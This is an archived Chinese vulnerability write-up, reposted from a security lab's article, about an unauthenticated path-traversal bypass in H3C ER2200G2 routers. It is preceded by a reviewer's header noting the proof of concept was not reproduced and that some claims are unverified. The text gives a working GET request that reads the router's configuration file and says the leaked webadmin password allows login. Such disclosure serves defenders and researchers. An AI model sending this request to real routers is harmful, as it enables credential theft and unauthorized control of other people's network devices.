---
source: "MrWQ/vulnerability-paper"
id: "vw-7aaad7dc6a994b03a508755a"
entity_id: "ve-7aaad7dc6a994b03a508755a"
schema_version: "1"
title: "H3C ER G2 系列路由器敏感信息泄露漏洞"
product: "H3C ER G2路由器"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "示例ER2200G2，未认证GET；固件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/H3C/H3C%20ER%20G2%20%E7%B3%BB%E5%88%97%E8%B7%AF%E7%94%B1%E5%99%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://mp.weixin.qq.com/s/EBNjRiQzyyAzSkDbaC6GEA"
source_status: "recorded"
---

# H3C ER G2 系列路由器敏感信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C ER G2路由器
- 本文讨论：路径规范化绕过读取型号配置
- 版本、权限与配置前提：示例ER2200G2，未认证GET；固件未给
- 资料类型：PoC转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- ERxxxxG2笼统扩展，只有ER2200G2具体路径
- 修复链接是ER3200产品页而非明确补丁或修复版本
- 关键webadmin响应与登录结果仅图片，冗长宣传尾巴
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 配置中密码格式和鉴权绕过细节待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/EBNjRiQzyyAzSkDbaC6GEA)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

 **本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**

ER G2 系列路由器是 H3C 公司推出的一款高性能路由器，它主要定位于以太网 / 光纤 / ADSL 接入的 SMB 市场和政府、企业机构、网吧等网络环境，如需要高速 Internet 带宽的网吧、企业、学校和酒店等。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

### ERxxxxG2 (ER2200G2)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1. 访问漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCsl6WNUnPh9j2UPTVpSDwQAib4IDAicLqQ4ib1EyIYMickVib2yDbeWic1tN6LK0qibtb667akmxPfZR5vw/640?wx_fmt=png)

2. 对漏洞进行复现

 **POC （GET）**

```http
GET /userLogin.asp/../actionpolicy_status/../ER2200G2.cfg HTTP/1.1
Host: 127.0.0.1:8081

```

     漏洞复现，请求该地址查看响应结果

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCsl6WNUnPh9j2UPTVpSDwQnOIYq0zS8RvTFLFjcHTMdNicXOGrcdXKfZiaVBpfPxXo06M7vYsqzziaA/640?wx_fmt=png)

 通过泄漏的账户密码信息**成功登录**。（响应中查询 webadmin 获取密码）

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCsl6WNUnPh9j2UPTVpSDwQYpiaGZ1wG7Vq6Zap8EmVM5wQ710tzeYPJ2s5icT2moq2ZM9A17G77U5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://www.h3c.com/cn/Products___Technology/Products/Router/Catalog/ER/ER3200/

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
